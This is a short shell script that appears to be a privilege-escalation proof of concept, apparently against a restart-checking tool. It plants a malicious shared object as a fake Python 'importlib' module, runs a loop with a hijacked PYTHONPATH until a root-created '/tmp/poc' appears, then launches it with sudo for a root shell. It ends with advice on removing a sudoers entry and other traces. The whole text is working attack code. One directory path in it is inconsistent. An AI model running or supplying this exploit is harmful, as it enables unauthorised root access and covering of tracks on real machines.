set -e
mkdir -p malicious/importlib
mv ~/__init__.so /tmp/malicious/importlib/__init__.so

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; clear;echo -e "\n\nWaiting for norestart execution...\nEnsure you remove yourself from sudoers on the poc file after\nsudo sed -i '/ALL ALL=NOPASSWD: \/tmp\/poc/d' /etc/sudoers\nAs well as remove excess files created:\nrm -rf malicious/ poc"; PYTHONPATH="$PWD" python3 e.py 2>/dev/null